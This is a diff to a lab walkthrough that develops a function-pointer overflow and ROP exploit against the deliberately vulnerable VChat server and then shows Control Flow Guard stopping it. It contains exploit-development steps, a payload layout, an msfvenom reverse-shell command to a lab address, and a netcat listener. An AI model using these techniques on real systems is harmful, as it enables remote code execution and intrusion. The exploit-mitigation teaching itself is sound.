@@ -363,10 +363,291 @@ The following section will build the standalone project and observe it's behavio
 > [!IMPORTANT]
 > Based on Current Testing the NXCompat flag `/NXCOMPAT` is required, the DynamicBase did not affect the /guard:cf flag. This does not align with the comments that the `/DYNAMICBASE` linker flag is required from the official [Microsoft Documentation](https://learn.microsoft.com/en-us/cpp/build/reference/guard-enable-control-flow-guard?view=msvc-170). We were able to successfully raise a Invalid Indirect Call Exception from the standalone code with `/DYNAMICBASE:NO` set to disable ASLR.
 -->
-## VChat
-
+## VChat Exploitation
 > [!NOTE]
-> This section is a Work in Progress and will be updated once completed. The *updated* VChat server will be required, ensure you are using Version `2.02` or greater.
+> The *updated* VChat server will be required, ensure you are using Version `2.02` or greater.
+
+This section will use a modified version of the [VChat TRUN ROP](https://github.com/DaintyJet/VChat_TRUN_ROP) walkthrough, as we will use CFG to guard against ROP attacks, as ASLR is enabled through the randomizing of the base address which is required for the CFG implemented by Windows to work and throw exceptions when accessing arbitrary memory locations. We will instead be exploiting the `FUNCC` command that has been added to the VChat server.
+### Initial  VChat Configuration
+1. Open the VChat Visual Studio Project.
+ 
+    <img src="Images/S1.png">
+
+2. Open the VChat project in Visual Studio and select `Project -> Properties`.
+
+    <img src="Images/S2.png">
+
+3. Open the `C/C++ -> Code Generation` configuration window and disable *Control Flow Guard*:
+
+    <img src="Images/S3.png">
+
+4. Open the `Linker -> Advanced` configuration window and enable *Data Execution Protection* DEP and *Randomized Base Address* (ASLR). Once done apply the changes and close the configuration window. 
+
+    <img src="Images/S4.png">
+
+    > [!NOTE]
+    > As DEP and ASLR are not the focus of this lab you can keep this disabled, or enable it. This does not affect the exploitation process until we enable CFG later. 
+
+5. Build the project with the shortcut `CTL+B` or by opening the `Build` window as shown below.
+
+    <img src="Images/S5.png">
+
+6. Open Immunity Debugger and attach it to the recompiled VChat executable.
+
+    <img src="Images/VEC5.png">
+
+### Exploit Setup and Non-CFG Observation
+This section will cover the steps used to setup the exploit, for more details on ROP Attacks see [VChat_ROP_Intro](https://github.com/DaintyJet/VChat_ROP_INTRO), and for a more detailed explanation of the exploitation process please see [VChat_TRUN_ROP](https://github.com/DaintyJet/VChat_TRUN_ROP) for a similar exploit. The main difference between this exploit and the *VChat_TRUN_ROP* is this exploit overflows a function pointer that is called, whereas the *VChat_TRUN_ROP* exploit overflows a return address.
+
+1. Generate a Cyclic Pattern, this is done so we will be able to tell where in memory the *Function Pointer* is stored so we can overwrite it with an address to start the ROP chain. We will use the [`pattern_create.rb`](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb) in the Kali VM in order to find the *exact* location the function pointer is in by examining the value stored in the registers. We will use the following command on the Kali Machine:
+
+    ```
+    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
+    ```
+
+2. Modify your exploit code to reflect [exploit1.py](./SRC/Exploits/exploit1.py) using the output from the *pattern_create.rb* command used previously. This script will inject the Cyclic Patterns into the VChat's stack. Run the exploit and observe the results in Immunity Debugger.  
+   1. Attach Immunity Debugger to the VChat Process. 
+
+        <img src="Images/VE1.png">
+
+    > [!NOTE]
+    > CFG is disabled, but we have enabled both DEP and NX to smooth over the later modifications needed when CFG is enabled. 
+
+   2. Click the red arrow to start executing
+
+        <img src="Images/VE2.png">
+    
+    3. Run the [exploit1.py](./SRC/Exploits/exploit1.py) script on the Kali machine targeting the machine where the VChat server is hosted. You may need to run the command `chmod +x exploit1.py` to make use of the shebang line.
+
+        <img src="Images/VE3.png">
+        
+    4. Observe the results of running [exploit1.py](./SRC/Exploits/exploit1.py), notice that an exception has been raised, this is likely due to the fact we have DEP (NX) enabled or we are jumping to an arbitrary memeory address (Read or Write Exceptions). 
+
+        <img src="Images/VE5.png">
+
+    5. Pass the exception to the process if you do not see an updated EIP register, use the keybind *Shift+F7* or any other listed at the bottom of the screen to pass the exception. Observe the value in the EIP register as this will be the address we overflowed into the function pointer.
+
+        <img src="Images/VE5.png">
+
+3. Using the value in the EIP register, in this case `61423361` can be used with the [`pattern_offset.rb`](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) to determine the relative location of the *function pointer* we are overflowing.
+
+    ```
+    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 61423361
+    ```
+   * We can see an example below
+
+        <img src="Images/VE6.png">
+
+4. (Optional) Use the [mona.py](https://github.com/corelan/mona) python program within Immunity Debugger to determine useful information about our target process. While the cyclic pattern from [exploit1.py] is in memory we can run the command `!mona findmsp` in the command line at the bottom of the Immunity Debugger GUI. **Note:** We must have sent the cyclic pattern and it must be present in the stack frame at the time we run this command!
+
+    <img src="Images/VE7.png">
+
+    * Again we can see that the string stored in the EIP register is located at an offset of `390`, this is the same value we got from the *pattern_offset*.
+5. Now we can modify our exploit program to reflect [exploit2.py](./SRC/Exploits/exploit2.py), we use this to verify the offset we previously discovered. If you have found the correct offset we will se a series of `42` in the EIP register as this is the ASCII code for `B`.
+
+    <img src="Images/VE8.png">
+
+<!-- 6. We now need to find the address of Virtual Protect, this can be done with Immunity Debugger or [Arwin](https://github.com/xinwenfu/arwin). Below is how it can be done with *Arwin*.
+   1. Download [Arwin](https://github.com/xinwenfu/arwin) if it has not already been downloaded.
+   2. Use the following command to locate where [`VirtualProtect`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) is loaded on the system. This will change each time the system reboots!
+        ```
+        .\arwin.exe kernel32 VirtualProtect
+        ```
+
+        <img src="Images/VE9.png"> -->
+
+7. Locate a RETN instruction address, and pick one that does not have the (READONLY) flag set.
+    ```
+    !mona find -type instr -s "retn" -p 45 -o
+    ```
+	* `!mona`: Run mona.py commands.
+	* `find`: Locate something withing the binary which has been loaded into Immunity debugger.
+	* `-type`: Specify the type of the object string we are searching for.
+		* `asc`: Search for an asci string.
+		* `bin`: Search for a binary string.
+		* `ptr`: Search for a pointer (memory address).
+		* `instr`: Search for a instruction.
+		* `file`: Search for a file.
+	* `-s "<String>"`: Specify the string we are searching for.
+	* `-p <number>`: Limit amount of output to the number we specify (May need to increase this to find instructions at an executable location).
+	* `-o`: Omit OS modules.
+
+    <img src="Images/VE10.png">
+
+8. Now modify your exploit program to reflect [exploit3.py](./SRC/Exploits/exploit3.py), we use this to verify that we are jumping to a `ret` instruction.
+
+    <video controls src="Videos/ROP-3.mp4" title="Title"></video>
+
+   1. Use the black *Go To Address in Disassembler* and enter in the address of the `ret` instruction you chose previously
+
+        <img src="Images/VE12.png">
+
+   2. Add a breakpoint. 
+
+        <img src="Images/VE13.png">
+
+   3. Run the [exploit3.py](./SRC/Exploits/exploit3.py), and observe the breakpoint being hit.
+
+        <img src="Images/VE14.png">
+
+9. We can use the following command provided by [mona.py](https://github.com/corelan/mona) to generate the chain for us. The resulting chains will be located in `rop_chains.txt`, if there are missing gadgets they could be located in `rop.txt` or `rop_suggestions.txt`. These will be located in the working directory for the mona.py program and Immunity Debugger, in my case this was in the directory `C:\Users<User>\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger`. You can also use the command `!mona config -set workingfolder c:\logs\E10` to set the folder our output will be stored in.
+
+   ```
+   !mona rop -m *.dll -n
+   ```
+   * `-m *.dll`: Search through all dll files when building ROP chains.
+   * `-n`: Ignore all modules that start with a Null Byte.
+
+    <img src="Images/VE11.png">
+
+10. Modify your exploit to reflect [exploit4.py](./SRC/Exploits/exploit4.py), we are using the function from the `rop_chains.txt`. We will need to be sure the return is `return b''.join(struct.pack('<I', _) for _ in rop_gadgets)` as without converting it to a byte string, we will receive errors! 
+
+    <video controls src="Videos/ROP-4.mp4" title="Title"></video>
+
+   1. Use the black *Go To Address in Disassembler* and enter in the address of the `ret` instruction you chose previously
+
+        <img src="Images/VE12.png">
+
+    2. Add a breakpoint.
+
+        <img src="Images/VE15.png">
+
+    3. Observe the behavior of the program, look at the stack and the ESP register, notice our ROP chain is not in view!
+
+        <img src="Images/VE18.png">
+
+11. Search for 3 or more `POP` instructions in a row followed by a return. This is because we need to remove the return address the call instruction pushes onto the stack, and the first 4 - 8 characters of the ASCII string we use to overflow the buffer. This is so we can more easily access the ROP chain we inject. 
+
+    1. Right click the Assembly View, Select `Search For ->
+
+        <img src="Images/VE16.png">
+
+    2. Search for a series of POP instructions followed by a return, an example is shown below.
+        ```
+        POP R32
+        POP R32
+        POP R32
+        RETN
+        ```
+        * `POP R32`: Searches for a POP instruction that stores the result in a 32-bit register
+        * `RETN`: Return instruction
+    3. Save the address of the first POP instruction, we can see in this case the addresses are located in `Essfun` which does not have ASLR enabled. This will replace the 
+
+        <img src="Images/VE17.png">
+
+12. Modify your program to reflect [exploit5.py](./SRC/Exploits/exploit5.py), we have modified the address we overflow the function pointer to be the address of the 3 `POP` instructions followed by a `RETN`, and we have moved the ROP Chain to be 2 bytes from start of the buffer.
+
+    <video controls src="Videos/ROP-5.mp4" title="Title"></video>
+
+   1. Use the black *Go To Address in Disassembler* and enter in the address of the sequence of `pop` instructions you chose previously.
+
+        <img src="Images/VE12.png">
+
+    2. Add a breakpoint.
+
+        <img src="Images/VE19.png">
+
+    3. Observe the behavior of the program, we can see the ROP chain is now accessable and step through it till the call to `VirtualProtect(...)`, Be sure to not to step into the function call the `VirtualProtect(...)` as this will crash the process. 
+
+        <img src="Images/VE20.png">
+
+13. Now we can add a payload to our exploit, this can be generated with [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html). Once generated modify your exploit code to reflect [exploit6.py](./SRC/Exploits/exploit6.py).
+    ```
+    $ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0d'
+    ```
+
+14. We generate the payload with the following structure:
+    ```
+    buff = 8
+
+    PAYLOAD = (
+        b'FUNCC /.' +
+        create_rop_chain() + 
+        b'\x90' * buff + 
+        SHELL +
+        b'\x90' * (792 - (len(create_rop_chain()) + len(SHELL) + buff)) +
+        struct.pack('<L', 0x00403C02) # This will need to be a function in a module with CFG enabled
+    )
+    ```
+    > [!NOTE]
+    > We put the Shellcode after 2 bytes or more of `NOP` instructions to prevent any conflicts/overwrites the VirtualProtect function would cause.
+
+15. Start a Netcat listener on the Kali machine in a new terminal. 
+    ```
+    $ nc -l -v -p 8080
+    ```
+16. Run the Exploit and observe the results! 
+
+    <video controls src="Videos/ROP-6.mp4" title="Title"></video>
+
+### CFG Enabled 
+This section will use the [exploit6.py](./SRC/Exploits/exploit6.py) script we previously created. However, in this scenario we will enable the CFG protections we have previously disabled. This also means if you chose to do the previous section with DEP and ASLR disabled you will also need to enabled those protections for CFG to work properly and raise exceptions.
+
+1. Open the VChat project in Visual Studio and select `Project -> Properties`.
+
+    <img src="Images/VEC1.png">
+
+2. Open the `C/C++ -> Code Generation` configuration window and enable *Control Flow Guard*:
+
+    <img src="Images/VEC2.png">
+
+3. Open the `Linker -> Advanced` configuration window and enable *Data Execution Protection* DEP and *Randomized Base Address* (ASLR). Once done apply the changes and close the configuration window.
+
+    <img src="Images/VEC3.png">
+
+4. Build the project with the shortcut `CTL+B` or by opening the `Build` window as shown below.
+
+    <img src="Images/VEC4.png">
+
+5. Open Immunity Debugger and attach it to the recompiled VChat executable.
+
+    <img src="Images/VEC5.png">
+
+6. Find a new sequence of 3 `POP` instructions followed by a `RETN`
+   1. Right click the Assembly view and select `Search For -> Sequence of Commands`:
+
+        <img src="Images/VEC6.png">
+    
+   2. Search for the set of commands
+
+        <img src="Images/VEC7.png">
+
+        * `POP R32`: Searches for a POP instruction that stores the result in a 32-bit register
+        * `RETN`: Return instruction
+
+    3. Copy the address of the first POP instruction.
+
+        <img src="Images/VEC8.png">
+
+7. Modify your [exploit6.py](./SRC/Exploits/exploit6.py) script to use the new address, run the script and observe the results.
+
+    <video controls src="Videos/CFG-ROP-1.mp4" title="Title"></video>
+
+   1. Start a Netcat listener on the Kali machine in a new terminal. 
+    ```
+    $ nc -l -v -p 8080
+    ```
+   2. Set a breakpoint at the address of the first POP instruction:
+
+        <img src="Images/VEC9.png">
+
+   3. Run the [exploit6.py](./SRC/Exploits/exploit6.py) script and observe the results. Notice we end with a `INT 29` instruction, this raises an interrupt with code 29, based on [Microsoft's Docs](https://learn.microsoft.com/en-us/cpp/intrinsics/fastfail?view=msvc-170#:~:text=Internally%2C%20__fastfail%20is%20implemented%20by%20using%20several%20architecture%2Dspecific%20mechanisms%3A) this means the exception code will be located in the ECX register.
+
+        <img src="Images/VEC10.png">
+
+    > [!IMPORTANT]
+    > Notice how we **did not** hit the breakpoint, this means the exception was raised at the time we attempted to preform the indirect function call.
+
+   4. We can try running this in Visual Studio attached to a debugger to confirm this exception is thrown at the Indirect Function Call and is due to address we overwrote the original function pointer with.
+
+        <img src="Images/VEC11.png">
+
+    > [!NOTE]
+    > The address we are overwriting the function pointer with my no longer valid due to the fact we enabled ASLR when compiling this project. As this is to give a more visual representation of the exception the address is not particularly important here as the exception will still be raised. In this case the location we pulled the series of POP instructions from did not appear to be randomized based on the additional information we could see when examining the function pointer local variable.
+
+## VChat Code
+> [!NOTE]
+> This section is a Work In Progress and will be updated once completed.
 ## References
 [[1] Control Flow Guard - Win32 app](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)
 
